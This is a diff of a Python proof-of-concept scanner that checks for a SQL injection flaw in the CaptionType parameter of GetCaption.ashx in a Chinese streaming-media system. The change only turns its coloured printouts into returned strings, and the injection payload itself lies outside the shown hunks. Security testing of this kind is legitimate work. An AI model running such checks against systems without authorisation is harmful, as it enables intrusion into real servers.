@@ -8,8 +8,8 @@ description: 文件GetCaption.ashx中,参数CaptionType存在SQL注入。
 '''
 import sys
 import requests
-import warnings
-from termcolor import cprint
+
+
 
 class viewgood_GetCaption_sqli_BaseVerify:
     def __init__(self, url):
@@ -24,12 +24,12 @@ class viewgood_GetCaption_sqli_BaseVerify:
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r"tyqMicrosoft" in req.text:
-                cprint("[+]存在远古流媒体系统 GetCaption.ashx注入漏洞...(高危)\tpayload: "+vulnurl, "red")
+                return "[+]存在远古流媒体系统 GetCaption.ashx注入漏洞...(高危)\tpayload: "+vulnurl
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-]connect timeout"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
+
     testVuln = viewgood_GetCaption_sqli_BaseVerify(sys.argv[1])
     testVuln.run()
